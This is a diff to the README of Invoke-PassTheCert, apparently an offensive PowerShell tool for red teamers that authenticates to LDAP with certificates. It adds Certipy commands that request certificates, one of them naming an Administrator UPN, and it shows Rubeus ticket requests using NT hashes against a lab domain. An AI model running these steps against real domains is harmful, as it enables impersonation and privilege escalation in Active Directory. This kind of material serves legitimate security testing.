@@ -5,7 +5,7 @@
 <img src="logo.png" />
 </div>
 
-## Description
+# Description
 
 Invoke-PassTheCert is a pure PowerShell port of PassTheCert. The purpose of this repository is to expand the landscape of PowerShell tooling available to Penetration testers and red teamers. 
 
@@ -13,7 +13,7 @@ The original work by AlmondOffsec can be found [here](https://github.com/AlmondO
 
 Sometimes, Domain Controllers do not support PKINIT. This can be because their certificates do not have the Smart Card Logon EKU. However, several protocols, including LDAP, support Schannel, thus authentication through TLS.
 
-## Changelog
+# Changelog
 
 This fork alters [the initial code](https://github.com/The-Viper-One/Invoke-PassTheCert/tree/24eaa20b9ac15a589f294ee4e80be345c994c90d) as follows:
 
@@ -34,7 +34,7 @@ This fork alters [the initial code](https://github.com/The-Viper-One/Invoke-Pass
 - Added a `_TODO` function to build a custom action.
 
 
-## Pre-requisite - GetTh4'Cert
+# Pre-requisite - GetTh4'Cert
 
 Provide a certificate allowed to authenticate against an LDAP/S Server. 
 
@@ -50,11 +50,9 @@ $ certipy-ad find -u '<user>@<domain>' -p '<password>' -enabled -stdout [-ns <dn
 $ certipy-ad req -u '<user>@<domain>' -p '<password>' -target '<dc_fqdn>' -ca '<ca_name>' -template 'User' [-ns <dns_ip>] [-dc-ip <dc_ip>] [-dc-host '<dc_host>']
 ```
 
-### From Windows (certreq)
+## From Windows
 
-Using [`certreq`](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862)
-
-#### Run a PowerShell Prompt as a domain principal
+### Run a PowerShell Prompt as a domain principal
 
 - Using a Password:
 
@@ -69,13 +67,15 @@ PS > Rubeus.exe createnetonly /program:powershell.exe /show
 PS (createnetonly) > Rubeus.exe asktgt /nowrap /domain:'<domain>' /dc:<dc_ip> /user:'<computer>$' /rc4:'<nthash>' /ptt
 ```
 
-#### Download the CA's certificate locally
+### Download the CA's certificate locally
 
 - Using [AD Modules](https://learn.microsoft.com/en-us/powershell/module/activedirectory/) through [RSAT](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools):
 
 ```powershell
 PS (runas/createnetonly) > Get-ADObject -Server ADLAB.LOCAL -Filter 'objectClass -eq "certificationAuthority"' -SearchBase "CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=ADLAB,DC=LOCAL" -Properties cACertificate |%{ Set-Content -Path ".\$($_.Name).cer" -Value $_.cACertificate[0] -Encoding Byte }
 ```
+
+> You MAY need to change the `-Server`'s domain (here `ADLAB.LOCAL`) to its IP (e.g. `192.168.56.202`) if you encounter the error `Either the target name is incorrect or the server has rejected the client credentials.` (e.g. when [this command is run from a trusted domain account to the trusting server](https://www.reddit.com/r/PowerShell/comments/szhb07/powershell_ad_commands_failing_when_passed/)).
 
 - Using MMC (requires admin on the targeted computer):
 
@@ -101,7 +101,7 @@ GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
         > DER encoded binary X.509 (.CER)
 ```
 
-#### Install the CA's certificate to trust it locally
+### Install the CA's certificate to trust it locally
 
 ```
 ADLAB-DC02-CA.cer 
@@ -109,6 +109,26 @@ ADLAB-DC02-CA.cer
     > Current User & Local Machine 
     > Automatically select the certificate store based on the type of certificate
 ```
+
+### Request a certificate (Certipy)
+
+Using [Certipy](https://github.com/ly4k/Certipy):
+
+- With a password:
+
+```powershell
+PS > Certipy.exe req -ca 'ADLAB-DC02-CA' -template 'User' -upn 'Administrator@ADLAB.LOCAL' -subject 'CN=Administrator,CN=Users,DC=ADLAB,DC=LOCAL' -dc-ip 192.168.56.202 -dc-host DC02.ADLAB.LOCAL -ns 192.168.56.202 -u 'Administrator@ADLAB.LOCAL' -p '<password>'
+```
+
+- With an NTHash:
+
+```powershell
+PS > Certipy.exe req -ca 'ADLAB-DC02-CA' -template 'Machine' -subject 'CN=MyComputer,CN=Computers,DC=ADLAB,DC=LOCAL' -dc-ip 192.168.56.202 -dc-host DC02.ADLAB.LOCAL -ns 192.168.56.202 -u 'MyComputer$' -hashes ':<nthash>'
+```
+
+### Request a certificate (certreq)
+
+Using [`certreq`](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862)
 
 #### Based on the provided `*.inf` file, create a request file, then request a certificate in the PowerShell session running as the domain principal
 
@@ -186,7 +206,7 @@ PS > Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.HasPrivateKey }
 80923C919950680113E282C68CCADFD8DBD30E2E  CN=SRV01.ADLAB.LOCAL
 ```
 
-#### Export the requested certificate into PFX format using [`Export-PfxCertificate`](https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate)
+##### Export the requested certificate into PFX format using [`Export-PfxCertificate`](https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate)
 
 ```powershell
 PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\0E58848B07CF3B3B408BA2F57400AC5AAE5F74D0) -FilePath 'Administrator.pfx' -Password (New-Object System.Security.SecureString)
@@ -196,7 +216,7 @@ PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\80923C91995
 > Here, both exported certificates (i.e. either from Linux, or Windows) are passwordless.
 
 
-## Usage - PassTh4'Cert
+# Usage - PassTh4'Cert
 
 Now, we may grab an LDAP Connection Instance, authenticating against an LDAP/S Server (e.g. `192.168.56.202:636`):
 
@@ -231,7 +251,7 @@ PS > .\Invoke-PassTheCert.ps1 -?
 PS > Invoke-PassTheCert -?
 ```
 
-## Available Actions
+# Available Actions
 
 ```powershell
 $ grep -A10 -P '^\s*function.*' Invoke-PassTheCert.ps1 |grep -vP '^(\s*|\s*<#\s*|\s+\.[A-Z]+.*|\s+(\[.*?\]|_.*)\s*)$' |sed 's/^\s\+//;s/function _\?\(.*\)[[:space:]]\+{/\n- ***\1***\n/;s/^- \(.*\)/\n> \1/' |grep -vP '^-+$'
@@ -398,7 +418,7 @@ Makin' My Own Custom Function.
 
 > The Custom Function MUST be implemented by YOU !
 
-## TODOs
+# TODOs
 
 - Support for Start TLS.
 - `CreateObject`: Implement more supported types.
